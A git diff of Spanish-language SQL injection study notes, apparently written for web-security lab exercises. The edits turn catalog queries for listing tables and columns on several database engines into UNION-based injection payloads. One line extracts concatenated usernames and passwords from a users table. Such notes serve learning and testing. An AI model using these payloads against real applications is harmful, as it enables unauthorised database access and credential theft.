@@ -53,14 +53,14 @@ USER-- | *cuando se tiene un usuario se podria probar la vulnerabilidad tratando
 
 #### LISTAR TABLAS DE LA BASE DE DATOS | [[Microsoft](https://learn.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/tables-transact-sql?view=sql-server-ver16) | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-table-reference.html) | [PostgreSQL](https://www.postgresql.org/docs/current/infoschema-tables.html)] 
 
-SELECT [columns] FROM information_schema.tables \
-SELECT [columns] FROM information_schema.columns \
-SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' 
+'UNION SELECT [columns] FROM information_schema.tables \
+'UNION SELECT [columns] FROM information_schema.columns \
+'UNION SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' 
 
 #### LISTAR TABLAS DE LA BASE DE DATOS | [[Oracle](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)] 
 
-SELECT [columns] FROM all_tables \
-SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS' 
+'UNION SELECT [columns] FROM all_tables \
+'UNION SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS' 
 
 #### MOSTRAR INFORMACION DE OTRAS TABLAS 
 
@@ -68,17 +68,17 @@ SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS'
 
 #### MOSTRAR MULTIPLES VALORES EN UNA MISMA COLUMNA [CONCATENACION]
 
-~: separator
+~: separador
 
 ORACLE: || \
 ex: 'string'||'string' \
 ' UNION SELECT username || '~' || password FROM users-- 
 
 MICROSOFT: + \
-ex: 'string'+'string' \
+ex: 'string'+'string' 
 
 POSTGRESQL: || \
-ex: 'string'||'string' \
+ex: 'string'||'string' 
 
 MySQL: [ ] "space" \
 ex: 'string' 'string'
